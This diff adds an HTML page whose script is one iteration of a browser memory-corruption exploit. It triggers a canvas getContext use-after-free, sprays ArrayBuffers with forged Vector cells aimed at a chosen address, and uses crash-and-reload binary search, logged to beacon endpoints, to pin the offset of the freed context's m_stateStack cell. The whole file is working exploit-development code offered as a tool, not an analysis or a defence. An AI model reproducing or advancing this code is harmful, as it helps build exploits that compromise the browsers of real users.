@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V916</title></head>
+<body><pre id="out">V916 — cell-everywhere consumption test + binary-search offset pin (zero region knowledge)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V916-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+/* sync-XHR PRE markers: position-proof across crashes (v915 run-1 lesson) */
+function bks(tag,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V916-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+}
+
+/*
+ * v916 — executes the v915 run-2 matrix row "forge written but NOT
+ * consumed": T was guaranteed-mapped (0x00007fffffffc000), sync PREs prove
+ * every death was AT the read, so the forge cell at +112 was never consumed
+ * by the read path. Two hypotheses remain:
+ *   (a) AB(768) never reclaims the freed ctx chunk on 14.22 (v904 premise);
+ *   (b) it reclaims but m_stateStack's Vector cell is NOT at ctx+112.
+ * This probe separates them with NO region knowledge, using a fill nobody
+ * has tried: instead of one cell at +112, write a VALID Vector cell
+ * {m_buffer=T, cap=1, size=1} at EVERY 16-byte position of the AB (48
+ * adjacent, non-overlapping cells; each independently at()-safe). The read
+ * consumes whichever position the real cell occupies — offset-free at
+ * 16-byte granularity, and the at() wrap law cannot bite (every cell has
+ * size=1).
+ *
+ * Phases (one risky read per load; next step persisted BEFORE the read):
+ *   A   cells at p = 0,16,...,752        -> return: cell is 16-aligned
+ *                                            relative to AB start -> B
+ *   A2  cells at p = 8,24,...,760        -> covers the 8-mod-16 half.
+ *                                            (A crash -> A2 crash means NO
+ *                                            valid cell is consumed
+ *                                            anywhere at 768-size -> C)
+ *   B   binary search over the winning
+ *       alignment's 48 blocks (6 loads): cells only in [lo,mid); return =>
+ *       cell in lower half (persist, reload); crash => upper half (the
+ *       reload's BOOT reads the pending interval and narrows).
+ *       Ends at one 16-byte block -> OFFSET-PIN p, CONTROL-COMPLETE.
+ *   C   (only if A and A2 both fail) AB size ladder with the phase-A fill:
+ *       sizes 512..1024 step 64, one load each, then parked with
+ *       C-EXHAUSTED (v904 premise dead; ctx-chunk forge lane closed).
+ *
+ * Decode:
+ *   OFFSET-PIN p + CONTROL-COMPLETE  -> positive control EXISTS; the v911
+ *      grid zero becomes a real region verdict once re-run with the pinned
+ *      cell (v917). The offset also measures the AB-start vs ctx-start
+ *      shift K on this build.
+ *   C-EXHAUSTED                      -> hypothesis (a) confirmed.
+ *
+ * ?r=1 resets all state. Defaults: T = 0x00007fffffffc000 (mapped stack
+ * page, 4 below the v911 band-3 top); ?t=HI-LO overrides.
+ */
+
+var qs = location.search;
+var tHi = 0x00007fff, tLo = 0xffffc000;
+var tm = qs.match(/[?&]t=([0-9a-fA-F]{1,8})-([0-9a-fA-F]{1,8})/);
+if (tm) { tHi = parseInt(tm[1],16); tLo = parseInt(tm[2],16); }
+var tHex = '0x' + ('00000000'+tHi.toString(16)).slice(-8) + ('00000000'+tLo.toString(16)).slice(-8);
+
+var SIZES = [512, 576, 640, 704, 768, 832, 896, 960, 1024];
+
+/* ---- persisted state ---- */
+var st = { phase:'A', sizeIdx:0, align:0, lo:0, hi:48, pending:null };
+try {
+  if (qs.indexOf('r=1') >= 0) {
+    localStorage.removeItem('v916_state');
+    bk('RESET','state cleared');
+  } else {
+    var raw = localStorage.getItem('v916_state');
+    if (raw) st = JSON.parse(raw);
+  }
+} catch(e) {}
+function save(){ try { localStorage.setItem('v916_state', JSON.stringify(st)); } catch(e) {} }
+
+/* pending = a step armed before its read whose load died before RESULT:
+   interpreted at BOOT as "the armed condition FAILED (crash at the read)". */
+if (st.pending) {
+  var p = st.pending; st.pending = null;
+  if (p.k === 'A')       { st.phase = 'A2'; bk('STEP','A failed (crash at read) -> A2'); }
+  else if (p.k === 'A2') { st.phase = 'C'; st.sizeIdx = 0; bk('STEP','A2 failed -> C (size ladder)'); }
+  else if (p.k === 'B')  { st.lo = p.mid; bk('STEP','B crash -> cell in [' + st.lo + ',' + st.hi + ')'); }
+  else if (p.k === 'C')  { st.sizeIdx++; bk('STEP','C size ' + p.s + ' failed -> idx ' + st.sizeIdx); }
+  save();
+}
+
+var PARKED = (st.phase === 'C' && st.sizeIdx >= SIZES.length);
+if (PARKED) {
+  bk('C-EXHAUSTED','no tested AB size (512..1024 step 64) reclaims the ctx chunk with a consumable cell — v904 premise DEAD on 14.22; ctx-chunk forge lane closed; attribution needs a different reclaim');
+} else {
+
+bk('BOOT','phase=' + st.phase + ' T=' + tHex +
+   (st.phase === 'B' ? ' interval=[' + st.lo + ',' + st.hi + ')' : '') +
+   (st.phase === 'C' ? ' size=' + SIZES[st.sizeIdx] : ''));
+
+/* ---- UAF cycle (v911-identical) ---- */
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+var innerCtx = null;
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', {get: function() {
+  innerCtx = canvas.getContext('2d');
+  return true;
+}});
+canvas.getContext('bitmaprenderer', uafOpts);
+
+if (!innerCtx) { bk('FAIL','no-uaf'); }
+else {
+  for (var f = 0; f < 600; f++) { var tmp = new ArrayBuffer(16); }
+  var sz = (st.phase === 'C') ? SIZES[st.sizeIdx] : 768;
+  var dvs = [];
+  for (var s = 0; s < 200; s++) {
+    var ab = new ArrayBuffer(sz);
+    var dv = new DataView(ab);
+    if (st.phase === 'A')       fillCells(dv, sz, 0);
+    else if (st.phase === 'A2') fillCells(dv, sz, 8);
+    else if (st.phase === 'B')  fillHalf(dv, sz, st.lo, st.hi, st.align ? 8 : 0);
+    else /* C */                fillCells(dv, sz, 0);
+    dvs.push(dv);
+  }
+  bk('SPRAY','phase=' + st.phase + '|n=200|size=' + sz + '|T=' + tHex);
+
+  /* arm the step, THEN the read (crash advances via the pending branch) */
+  if (st.phase === 'A')       { st.pending = {k:'A'}; }
+  else if (st.phase === 'A2') { st.pending = {k:'A2'}; }
+  else if (st.phase === 'B')  { st.pending = {k:'B', mid: (st.lo + st.hi) >> 1}; }
+  else                        { st.pending = {k:'C', s: sz}; }
+  save();
+  var wd = setTimeout(function(){ setTimeout(function(){ location.reload(); }, 300); }, 15000);
+
+  bks('READ-PRE','phase=' + st.phase + ' (sync, position-proof)');
+  var leaked = innerCtx.lineWidth;
+  clearTimeout(wd);
+  st.pending = null; save();
+
+  /* ALIVE — L6: any returned value is a return-channel event */
+  var b8=new ArrayBuffer(8), fa=new Float64Array(b8), u=new Uint32Array(b8);
+  fa[0]=leaked;
+  var lwhex='0x'+('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);
+  bk('RESULT','phase=' + st.phase + '|lw='+leaked+'|hex='+lwhex);
+
+  if (st.phase === 'A') {
+    st.align = 0; st.phase = 'B'; st.lo = 0; st.hi = 48; save();
+    bk('CONTROL','CONSUMED cell is 16-aligned rel. AB start -> binary search');
+    setTimeout(function(){ location.reload(); }, 400);
+  } else if (st.phase === 'A2') {
+    st.align = 8; st.phase = 'B'; st.lo = 0; st.hi = 48; save();
+    bk('CONTROL','CONSUMED cell is 8-mod-16 rel. AB start -> binary search');
+    setTimeout(function(){ location.reload(); }, 400);
+  } else if (st.phase === 'B') {
+    var mid = (st.lo + st.hi) >> 1;
+    st.hi = mid; save();   /* return => cell in lower half */
+    if (st.hi - st.lo <= 1) {
+      var pin = st.align ? st.lo*16 + 8 : st.lo*16;
+      bk('OFFSET-PIN','p=' + pin + ' (block ' + st.lo + ', align=' + st.align + ')');
+      bk('CONTROL','COMPLETE m_stateStack Vector cell consumed at AB+' + pin +
+         ' with T=' + tHex + ' mapped — positive control exists; v917 re-runs the region grid with the pinned cell');
+    } else {
+      bk('B-STEP','cell in [' + st.lo + ',' + st.hi + ') -> reload');
+      setTimeout(function(){ location.reload(); }, 400);
+    }
+  } else { /* C returned — a different AB size reclaims with a 16-aligned cell */
+    bk('CONTROL','CONSUMED at size=' + sz + ' (16-aligned rel. AB start) — v904 premise alive at a different size; binary search next via reload');
+    st.phase = 'B'; st.lo = 0; st.hi = 48; st.align = 0; save();
+    setTimeout(function(){ location.reload(); }, 400);
+  }
+
+  /* safety: clear forged cells (process survived the read) */
+  for (var c = 0; c < dvs.length; c++) {
+    dvs[c].setFloat64(0, 0, true);
+  }
+}
+}
+
+function fillCells(dv, len, off8) {
+  /* valid {T, cap=1, size=1} cell at every 16-byte position starting at
+     off8 (0 or 8); zeros elsewhere (matches the zero-at-free baseline —
+     L7: the read path touches only the cell and T+0x30) */
+  var p = off8;
+  while (p + 16 <= len) {
+    dv.setUint32(p,    tLo, true);
+    dv.setUint32(p+4,  tHi, true);
+    dv.setUint32(p+8,  1, true);   /* m_capacity */
+    dv.setUint32(p+12, 1, true);   /* m_size     */
+    p += 16;
+  }
+}
+function fillHalf(dv, len, lo, hi, off8) {
+  /* phase B: valid cells only for block indices [lo,hi); zeros elsewhere */
+  var bi = 0, p = off8;
+  while (p + 16 <= len) {
+    if (bi >= lo && bi < hi) {
+      dv.setUint32(p,    tLo, true);
+      dv.setUint32(p+4,  tHi, true);
+      dv.setUint32(p+8,  1, true);
+      dv.setUint32(p+12, 1, true);
+    }
+    bi++; p += 16;
+  }
+}
+</script></body></html>
